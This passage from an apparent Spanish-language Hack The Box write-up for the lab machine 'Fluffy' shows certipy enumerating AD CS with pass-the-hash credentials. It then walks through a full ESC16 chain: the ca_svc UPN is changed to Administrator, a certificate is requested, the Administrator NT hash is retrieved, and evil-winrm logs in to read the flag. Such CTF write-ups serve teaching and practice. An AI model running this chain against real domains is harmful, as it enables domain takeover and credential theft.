</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Identity <span style="color:#e6db74">&#39;FLUFFY\Domain Users&#39;</span> has enrollment rights <span style="color:#66d9ef">for</span> template <span style="color:#e6db74">&#39;User&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template Name: User
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template distinguishedname: CN<span style="color:#f92672">=</span>User,CN<span style="color:#f92672">=</span>Certificate Templates,CN<span style="color:#f92672">=</span>Public Key Services,CN<span style="color:#f92672">=</span>Services,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Date of Creation: 04/17/2025 16:10:16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extended Key Usage: Encrypting File System, Secure E-mail, Client Authentication
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EnrollmentFlag: INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CertificateNameFlag: SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enrollment allowed <span style="color:#66d9ef">for</span>: FLUFFY<span style="color:#ae81ff">\D</span>omain Users
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> +++++ Checking Template <span style="color:#e6db74">&#39;SubCA&#39;</span> +++++
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Template <span style="color:#e6db74">&#39;SubCA&#39;</span> has Flag <span style="color:#e6db74">&#39;ENROLLEE_SUPPLIES_SUBJECT&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template Name: SubCA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template distinguishedname: CN<span style="color:#f92672">=</span>SubCA,CN<span style="color:#f92672">=</span>Certificate Templates,CN<span style="color:#f92672">=</span>Public Key Services,CN<span style="color:#f92672">=</span>Services,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Date of Creation: 04/17/2025 16:10:16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EnrollmentFlag: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CertificateNameFlag: ENROLLEE_SUPPLIES_SUBJECT
</span></span></code></pre></div><p>Luego probamos a buscar con certipy posibles configuraciones ADCS que sean vulnerables a una explotación con los tres usuarios que tenemos acceso:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy find -u <span style="color:#e6db74">&#39;ldap_svc@fluffy.htb&#39;</span> -hashes 22151d74ba3de931a352cba1f9393a37 -dc-ip 10.10.11.69 -vulnerable -stdout
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">33</span> certificate templates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">11</span> enabled certificate templates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via CSRA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got error <span style="color:#66d9ef">while</span> trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via CSRA: Could not connect: timed out
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via RRP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Authorities
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CA Name : fluffy-DC01-CA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DNS Name : DC01.fluffy.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Subject : CN<span style="color:#f92672">=</span>fluffy-DC01-CA, DC<span style="color:#f92672">=</span>fluffy, DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Validity Start : 2025-04-17 16:00:16+00:00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Validity End : 3024-04-17 16:11:16+00:00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Web Enrollment : Disabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Specified SAN : Disabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Request Disposition : Issue
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enforce Encryption <span style="color:#66d9ef">for</span> Requests : Enabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Permissions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Owner : FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Access Rights
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ManageCertificates : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ManageCa : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enroll : FLUFFY.HTB<span style="color:#ae81ff">\C</span>ert Publishers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Templates : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy find -u <span style="color:#e6db74">&#39;winrm_svc@fluffy.htb&#39;</span> -hashes 33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.10.11.69 -vulnerable -stdout
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">33</span> certificate templates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">11</span> enabled certificate templates
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via CSRA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got error <span style="color:#66d9ef">while</span> trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via CSRA: Could not connect: timed out
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via RRP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Authorities
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CA Name : fluffy-DC01-CA
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DNS Name : DC01.fluffy.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Subject : CN<span style="color:#f92672">=</span>fluffy-DC01-CA, DC<span style="color:#f92672">=</span>fluffy, DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Validity Start : 2025-04-17 16:00:16+00:00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Validity End : 3024-04-17 16:11:16+00:00
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Web Enrollment : Disabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Specified SAN : Disabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Request Disposition : Issue
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enforce Encryption <span style="color:#66d9ef">for</span> Requests : Enabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Permissions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Owner : FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Access Rights
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ManageCertificates : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ManageCa : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enroll : FLUFFY.HTB<span style="color:#ae81ff">\C</span>ert Publishers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certificate Templates : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
</span></span></code></pre></div><blockquote>
<p>He visto que mi versión de certipy estaba desactualizada y la vulnerabilidad ESC16 solo se muestra con Certipy v5.0.2. Una vez que actualizamos certipy conseguimos ver la vulnerabilidad ESC16 que contiene la máquina.</p>
</blockquote>
<h2 id="esc16-explotation-case-with-certipy">ESC16 explotation case with certipy<a hidden class="anchor" aria-hidden="true" href="#esc16-explotation-case-with-certipy">#</a></h2>
<p><a href="">https://gzzcoo.gitbook.io/pentest-notes/~gitbook/icon?size=small&amp;theme=light</a></p>
<p><a href="">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy find -u <span style="color:#e6db74">&#39;ca_svc@fluffy.htb&#39;</span> -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -stdout
</span></span><span style="display:flex;"><span>Certipy v5.0.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">33</span> certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">11</span> enabled certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">14</span> issuance policies
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> via RRP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;fluffy-DC01-CA&#39;</span> @ <span style="color:#e6db74">&#39;DC01.fluffy.htb&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
</span></span><span style="display:flex;"><span>Certificate Authorities
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    CA Name                             : fluffy-DC01-CA
</span></span><span style="display:flex;"><span>    DNS Name                            : DC01.fluffy.htb
</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>fluffy-DC01-CA, DC<span style="color:#f92672">=</span>fluffy, DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
</span></span><span style="display:flex;"><span>    Certificate Validity End            : 3024-04-17 16:11:16+00:00
</span></span><span style="display:flex;"><span>    Web Enrollment
</span></span><span style="display:flex;"><span>      HTTP
</span></span><span style="display:flex;"><span>        Enabled                         : False
</span></span><span style="display:flex;"><span>      HTTPS
</span></span><span style="display:flex;"><span>        Enabled                         : False
</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span><span style="display:flex;"><span>    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
</span></span><span style="display:flex;"><span>    Permissions
</span></span><span style="display:flex;"><span>      Owner                             : FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>      Access Rights
</span></span><span style="display:flex;"><span>        ManageCa                        : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>        ManageCertificates              : FLUFFY.HTB<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          FLUFFY.HTB<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>        Enroll                          : FLUFFY.HTB<span style="color:#ae81ff">\C</span>ert Publishers
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
</span></span><span style="display:flex;"><span>      ESC16                             : Security Extension is disabled.
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Remarks
</span></span><span style="display:flex;"><span>      ESC16                             : Other prerequisites may be required <span style="color:#66d9ef">for</span> this to be exploitable. See the wiki <span style="color:#66d9ef">for</span> more details.
</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
</span></span></code></pre></div><p>Para poder explotar esta vulnerabilidad, tenemos que actualizar el UPN de ca_svc al del usuario Administrador.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy account -u winrm_svc -hashes <span style="color:#e6db74">&#39;:33bd09dcd697600edf6b3a7af4875767&#39;</span> -dc-ip <span style="color:#e6db74">&#39;10.10.11.69&#39;</span>  -upn <span style="color:#e6db74">&#39;Administrator&#39;</span> -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> update
</span></span><span style="display:flex;"><span>Certipy v5.0.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
</span></span><span style="display:flex;"><span>    userPrincipalName                   : Administrator
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_svc&#39;</span>
</span></span></code></pre></div><p>Luego con el usuario ca_svc pedimos obtener el certificado con el nombre UPN &lsquo;Administrator&rsquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf5❯ certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target <span style="color:#e6db74">&#39;fluffy.htb&#39;</span> -ca <span style="color:#e6db74">&#39;FLUFFY-DC01-CA&#39;</span> -template <span style="color:#e6db74">&#39;User&#39;</span> -upn <span style="color:#e6db74">&#39;Administrator&#39;</span> -dc-ip 10.10.11.69
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v5.0.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">41</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;Administrator&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
</span></span></code></pre></div><blockquote>
<p>Antes de ir a por el hash NTLM debemos devolverle el UPN al usuario ca_svc para que no haya conflicto a la hora de extraer el hash NTLM del usuario Administrator.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy account -u winrm_svc -hashes <span style="color:#e6db74">&#39;:33bd09dcd697600edf6b3a7af4875767&#39;</span> -dc-ip <span style="color:#e6db74">&#39;10.10.11.69&#39;</span> -upn <span style="color:#e6db74">&#39;ca_svc&#39;</span> -user <span style="color:#e6db74">&#39;ca_svc&#39;</span> update
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v5.0.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_svc&#39;</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>userPrincipalName : ca_svc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_svc&#39;</span>
</span></span></code></pre></div><p>Ahora ya podemos extraer el hash NTLM directamente con <code>certipy auth</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69 -username Administrator -domain fluffy.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Certipy v5.0.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SAN UPN: <span style="color:#e6db74">&#39;Administrator&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;administrator@fluffy.htb&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator@fluffy.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
</span></span></code></pre></div><p>Cogemos el hash NTLM y lo usamos para autenticar-nos a través de <code>Evil-Winrm</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ evil-winrm -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; type ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
</span></span><span style="display:flex;"><span>2bebc74d579d3c561233c04eabe96a5b
